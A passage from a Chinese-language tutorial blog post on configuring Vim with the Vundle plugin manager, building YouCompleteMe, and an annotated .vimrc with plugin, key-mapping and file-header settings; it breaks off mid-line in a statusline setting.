<p>在<code>~/.vimrc</code>头部添加以下信息(下面的几个Plugin是例子)：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible              <span class="string">&quot; be iMproved, required</span></span><br><span class="line"><span class="string">filetype off                  &quot;</span> required</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">&quot;</span> alternatively, pass a path <span class="built_in">where</span> Vundle should install plugins</span><br><span class="line"><span class="string">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">let</span> Vundle manage Vundle, required</span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="string">&quot;</span> Keep Plugin commands between vundle#begin/end.</span><br><span class="line"><span class="string">&quot; plugin on GitHub repo</span></span><br><span class="line"><span class="string">Plugin &#x27;tpope/vim-fugitive&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> plugin from http://vim-scripts.org/vim/scripts.html</span><br><span class="line"><span class="string">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> Git plugin not hosted on GitHub</span><br><span class="line">Plugin <span class="string">&#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="string">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="string">Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> The sparkup vim script is <span class="keyword">in</span> a subdirectory of this repo called vim.</span><br><span class="line"><span class="string">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line"><span class="string">Plugin &#x27;rstacruz/sparkup&#x27;, &#123;&#x27;rtp&#x27;: &#x27;vim/&#x27;&#125;</span></span><br><span class="line"><span class="string">&quot;</span> Install L9 and avoid a Naming conflict <span class="keyword">if</span> you<span class="string">&#x27;ve already installed a</span></span><br><span class="line"><span class="string">&quot; different version somewhere else.</span></span><br><span class="line"><span class="string">&quot; Plugin &#x27;</span>ascenator/L9<span class="string">&#x27;, &#123;&#x27;</span>name<span class="string">&#x27;: &#x27;</span>newL9<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="string">call vundle#end()            &quot; required</span></span><br><span class="line"><span class="string">filetype plugin indent on    &quot; required</span></span><br><span class="line"><span class="string">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="string">&quot;filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; Brief help</span></span><br><span class="line"><span class="string">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="string">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="string">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"><span class="string">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="string">&quot; Put your non-Plugin stuff after this line</span></span><br></pre></td></tr></table></figure>



<p><strong>安装插件方法</strong>：</p>
<ul>
<li>打开vim，执行命令：<code>:PluginInstall</code></li>
<li>命令行中运行：<code>vim +PluginInstall +qall</code></li>
</ul>
<p><strong>移除不需要的插件</strong>：</p>
<ul>
<li>删去.vimrc中对应行后执行BundleClean</li>
</ul>
<p>更新插件：BundleUpdate</p>
<p>列出插件：BundleList</p>
<p>查找插件：BundleSearch</p>
<h2 id="安装YouCompleteMe"><a href="#安装YouCompleteMe" class="headerlink" title="安装YouCompleteMe"></a>安装YouCompleteMe</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo apt install build-essential cmake vim-nox python3-dev exuberant-ctags</span><br><span class="line">sudo apt install mono-complete golang nodejs openjdk-17-jdk openjdk-17-jre npm</span><br><span class="line">cd ~/.vim/bundle/</span><br><span class="line">git clone https://github.com/ycm-core/YouCompleteMe.git</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">python3 install.py --all</span><br></pre></td></tr></table></figure>

<p>中间有一些库可能需要开代理，比如gopls</p>
<p>最终解决方案是修改代理，然后在 cmd 下面输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<p>安装结束后关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=off</span><br></pre></td></tr></table></figure>



<h2 id="配置-vimrc"><a href="#配置-vimrc" class="headerlink" title="配置.vimrc"></a>配置.vimrc</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible              <span class="string">&quot; be iMproved, required</span></span><br><span class="line"><span class="string">filetype off                  &quot;</span> required</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">&quot;</span> alternatively, pass a path <span class="built_in">where</span> Vundle should install plugins</span><br><span class="line"><span class="string">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">let</span> Vundle manage Vundle, required</span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; YouCompeleteMe: 语句补全插件</span></span><br><span class="line"><span class="string">set runtimepath+=~/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">autocmd InsertLeave * if pumvisible() == 0|pclose|endif &quot;</span>离开插入模式后自动关闭预览窗口</span><br><span class="line"><span class="built_in">let</span> g:ycm_collect_identifiers_from_tags_files = 1           <span class="string">&quot; 开启 YCM基于标签引擎</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot;</span> 注释与字符串中的内容也用于补全</span><br><span class="line"><span class="built_in">let</span> g:syntastic_ignore_files=[<span class="string">&quot;.*\.py$&quot;</span>]</span><br><span class="line"><span class="built_in">let</span> g:ycm_seed_identifiers_with_syntax = 1                  <span class="string">&quot; 语法关键字补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1</span></span><br><span class="line"><span class="string">let g:ycm_confirm_extra_conf = 0                            &quot;</span> 关闭加载.ycm_extra_conf.py提示</span><br><span class="line"><span class="built_in">let</span> g:ycm_key_list_select_completion = [<span class="string">&#x27;&lt;c-n&gt;&#x27;</span>, <span class="string">&#x27;&lt;Down&gt;&#x27;</span>]  <span class="string">&quot; 映射按键,没有这个会拦截掉tab, 导致其他插件的tab不能用.</span></span><br><span class="line"><span class="string">let g:ycm_key_list_previous_completion = [&#x27;&lt;c-p&gt;&#x27;, &#x27;&lt;Up&gt;&#x27;]</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1                          &quot;</span> 在注释输入中也能补全</span><br><span class="line"><span class="built_in">let</span> g:ycm_complete_in_strings = 1                           <span class="string">&quot; 在字符串输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot;</span> 注释和字符串中的文字也会被收入补全</span><br><span class="line"><span class="built_in">let</span> g:ycm_global_ycm_extra_conf=<span class="string">&#x27;~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&#x27;</span></span><br><span class="line"><span class="built_in">let</span> g:ycm_show_diagnostics_ui = 0                           <span class="string">&quot; 禁用语法检查</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;CR&gt; pumvisible() ? &quot;</span>\&lt;C-y&gt;<span class="string">&quot; : &quot;</span>\&lt;CR&gt;<span class="string">&quot;             &quot;</span> 回车即选中当前项</span><br><span class="line">nnoremap &lt;c-j&gt; :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt;     <span class="string">&quot; 跳转到定义处</span></span><br><span class="line"><span class="string">let g:ycm_min_num_of_chars_for_completion=2                 &quot;</span> 从第2个键入字符就开始罗列匹配项</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; github 仓库中的插件</span></span><br><span class="line"><span class="string">&quot;</span> vim-airline 配置：优化vim界面</span><br><span class="line">Plugin <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;let g:airline#extensions#tabline#enabled = 1</span></span><br><span class="line"><span class="string">&quot;</span> airline 设置</span><br><span class="line"><span class="string">&quot; 显示颜色</span></span><br><span class="line"><span class="string">set t_Co=256</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">&quot;</span> 使用powerline打过补丁的字体</span><br><span class="line"><span class="built_in">let</span> g:airline_powerline_fonts = 1</span><br><span class="line"><span class="string">&quot; 开启tabline</span></span><br><span class="line"><span class="string">let g:airline#extensions#tabline#enabled=1</span></span><br><span class="line"><span class="string">&quot;</span> tabline中当前buffer两端的分隔字符</span><br><span class="line"><span class="built_in">let</span> g:airline#extensions#tabline#left_sep = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="string">&quot; tabline中未激活buffer两端的分隔字符</span></span><br><span class="line"><span class="string">let g:airline#extensions#tabline#left_alt_sep = &#x27; &#x27;</span></span><br><span class="line"><span class="string">&quot;</span> tabline中buffer显示编号</span><br><span class="line"><span class="built_in">let</span> g:airline#extensions#tabline#buffer_nr_show = 1</span><br><span class="line"><span class="string">&quot; 映射切换buffer的键位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nnoremap [b :bp&lt;CR&gt;</span></span><br><span class="line"><span class="string">nnoremap ]b :bn&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span> 映射&lt;leader&gt;num到num buffer</span><br><span class="line">map &lt;leader&gt;1 :b 1&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;2 :b 2&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;3 :b 3&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;4 :b 4&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;5 :b 5&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;6 :b 6&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;7 :b 7&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;8 :b 8&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;9 :b 9&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; vim-scripts 中的插件</span></span><br><span class="line"><span class="string">Plugin &#x27;taglist.vim&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> ctags 配置: F3快捷键显示程序中的各种tags，包括变量和函数</span><br><span class="line">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span><br><span class="line"><span class="built_in">let</span> Tlist_Use_Right_Window=1</span><br><span class="line"><span class="built_in">let</span> Tlist_Show_One_File=1</span><br><span class="line"><span class="built_in">let</span> Tlist_Exit_OnlyWindow=1</span><br><span class="line"><span class="built_in">let</span> Tlist_WinWidt=25</span><br><span class="line"></span><br><span class="line">Plugin <span class="string">&#x27;The-NERD-tree&#x27;</span></span><br><span class="line"><span class="string">&quot;NERDTree 配置: F2快捷键显示当前目录树</span></span><br><span class="line"><span class="string">map &lt;F2&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">let NERDTreeWinSize=25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Plugin &#x27;indentLine.vim&#x27;</span></span><br><span class="line"><span class="string">Plugin &#x27;delimitMate.vim&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 非 github 仓库的插件</span><br><span class="line"><span class="string">&quot; Plugin &#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="string">Plugin &#x27;git@github.com:vim-python/python-syntax.git&#x27;</span></span><br><span class="line"><span class="string">let g:python_highlight_all = 1</span></span><br><span class="line"><span class="string">let g:python_highlight_indent_errors = 0</span></span><br><span class="line"><span class="string">&quot;</span> 本地仓库的插件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="string">call vundle#end()            &quot;</span> required</span><br><span class="line">filetype plugin indent on    <span class="string">&quot; required</span></span><br><span class="line"><span class="string">&quot;</span> To ignore plugin indent changes, instead use:</span><br><span class="line"><span class="string">&quot;filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; Brief help</span></span><br><span class="line"><span class="string">&quot;</span> :PluginList       - lists configured plugins</span><br><span class="line"><span class="string">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="string">&quot;</span> :PluginSearch foo - searches <span class="keyword">for</span> foo; append `!` to refresh <span class="built_in">local</span> cache</span><br><span class="line"><span class="string">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="string">&quot;</span> Put your non-Plugin stuff after this line</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>新文件标题</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;新建.c,.h,.sh,.java文件，自动插入文件头</span></span><br><span class="line"><span class="string">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec &quot;</span>:call SetTitle()<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;定义函数SetTitle，自动插入文件头</span></span><br><span class="line"><span class="string">func SetTitle()</span></span><br><span class="line"><span class="string">	&quot;</span>如果文件类型为.sh文件</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">		call setline(1, <span class="string">&quot;##########################################################################&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>), <span class="string">&quot;# File Name: &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+1, <span class="string">&quot;# Author: eutopia&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+2, <span class="string">&quot;# mail: 2715417602@qq.com&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+3, <span class="string">&quot;# Created Time: &quot;</span>.strftime(<span class="string">&quot;%c&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+4, <span class="string">&quot;#########################################################################&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+5, <span class="string">&quot;#!/bin/bash&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+8, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		call setline(1, <span class="string">&quot;/*************************************************************************&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>), <span class="string">&quot;	&gt; File Name: &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+1, <span class="string">&quot;	&gt; Author: eutopia&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+2, <span class="string">&quot;	&gt; Mail: 2715417602@qq.com &quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+3, <span class="string">&quot;	&gt; Created Time: &quot;</span>.strftime(<span class="string">&quot;%c&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+4, <span class="string">&quot; ************************************************************************/&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+5, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;cpp&#x27;</span></span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+6, <span class="string">&quot;#include&lt;iostream&gt;&quot;</span>)</span><br><span class="line">    	call append(line(<span class="string">&quot;.&quot;</span>)+7, <span class="string">&quot;using namespace std;&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+8, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;c&#x27;</span></span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+6, <span class="string">&quot;#include&lt;stdio.h&gt;&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+7, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="string">&quot;	if &amp;filetype == &#x27;java&#x27;</span></span><br><span class="line"><span class="string">	&quot;</span>		call append(line(<span class="string">&quot;.&quot;</span>)+6,<span class="string">&quot;public class &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">	<span class="string">&quot;		call append(line(&quot;</span>.<span class="string">&quot;)+7,&quot;</span><span class="string">&quot;)</span></span><br><span class="line"><span class="string">	&quot;</span>	endif</span><br><span class="line">	<span class="string">&quot;新建文件后，自动定位到文件末尾</span></span><br><span class="line"><span class="string">	autocmd BufNewFile * normal G</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 映射全选+复制 ctrl + a</span><br><span class="line">map &lt;C-A&gt; ggVGY</span><br><span class="line">map! &lt;C-A&gt; &lt;Esc&gt;ggVGY</span><br><span class="line">map &lt;F12&gt; gg=G</span><br><span class="line"><span class="string">&quot; 选中状态下 Crtl+c 复制</span></span><br><span class="line"><span class="string">vmap &lt;C-c&gt; &quot;</span>+y</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>实用设置</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> 设置当文件被改动时自动载入</span><br><span class="line"><span class="built_in">set</span> autoread</span><br><span class="line"><span class="string">&quot; quickfix模式</span></span><br><span class="line"><span class="string">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; :w&lt;cr&gt;:make&lt;cr&gt;</span></span><br><span class="line"><span class="string">&quot;</span>代码补全</span><br><span class="line"><span class="built_in">set</span> completeopt=preview,menu</span><br><span class="line"><span class="string">&quot;允许插件</span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span>共享剪贴板</span><br><span class="line"><span class="built_in">set</span> clipboard=unnamedplus</span><br><span class="line"><span class="string">&quot;从不备份</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">&quot;</span>make 运行</span><br><span class="line">:<span class="built_in">set</span> makeprg=g++\ -Wall\ \ %</span><br><span class="line"><span class="string">&quot;自动保存</span></span><br><span class="line"><span class="string">set autowrite</span></span><br><span class="line"><span class="string">set ruler                   &quot;</span> 打开状态栏标尺</span><br><span class="line"><span class="built_in">set</span> cursorline              <span class="string">&quot; 突出显示当前行</span></span><br><span class="line"><span class="string">set magic                   &quot;</span> 设置魔术</span><br><span class="line"><span class="built_in">set</span> guioptions-=T           <span class="string">&quot; 隐藏工具栏</span></span><br><span class="line"><span class="string">set guioptions-=m           &quot;</span> 隐藏菜单栏</span><br><span class="line"><span class="string">&quot;set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span></span><br><span class="line"><span class="string">&quot;</span> 设置在状态行显示的信息</span><br><span class="line"><span class="string">&quot; set foldcolumn=0</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> foldmethod=indent</span><br><span class="line"><span class="string">&quot; set foldlevel=3</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> foldenable              <span class="string">&quot; 开始折叠</span></span><br><span class="line"><span class="string">&quot;</span> 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line"><span class="built_in">set</span> nocompatible</span><br><span class="line"><span class="string">&quot; 语法高亮</span></span><br><span class="line"><span class="string">syntax on</span></span><br><span class="line"><span class="string">&quot;</span> 去掉输入错误的提示声音</span><br><span class="line"><span class="built_in">set</span> noeb</span><br><span class="line"><span class="string">&quot; 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string">&quot;</span> 自动缩进</span><br><span class="line"><span class="built_in">set</span> autoindent</span><br><span class="line"><span class="built_in">set</span> cindent</span><br><span class="line"><span class="string">&quot; Tab键的宽度</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">&quot;</span> 统一缩进为4</span><br><span class="line"><span class="built_in">set</span> softtabstop=4</span><br><span class="line"><span class="built_in">set</span> shiftwidth=4</span><br><span class="line"><span class="string">&quot; 不要用空格代替制表符</span></span><br><span class="line"><span class="string">set noexpandtab</span></span><br><span class="line"><span class="string">&quot;</span> 在行和段开始处使用制表符</span><br><span class="line"><span class="built_in">set</span> smarttab</span><br><span class="line"><span class="string">&quot; 显示行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">&quot;</span> 历史记录数</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span>=1000</span><br><span class="line"><span class="string">&quot;禁止生成临时文件</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">set noswapfile</span></span><br><span class="line"><span class="string">&quot;</span>搜索忽略大小写</span><br><span class="line"><span class="built_in">set</span> ignorecase</span><br><span class="line"><span class="string">&quot;搜索逐字符高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string">&quot;</span>行内替换</span><br><span class="line"><span class="built_in">set</span> gdefault</span><br><span class="line"><span class="string">&quot;编码设置</span></span><br><span class="line"><span class="string">set enc=utf-8</span></span><br><span class="line"><span class="string">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span></span><br><span class="line"><span class="string">&quot;</span>语言设置</span><br><span class="line"><span class="built_in">set</span> langmenu=zh_CN.UTF-8</span><br><span class="line"><span class="built_in">set</span> helplang=cn</span><br><span class="line"><span class="string">&quot; 我的状态行显示的内容（包括文件类型和解码）</span></span><br><span class="line"><span class="string">set statusline=%F%m%r%h%w\ 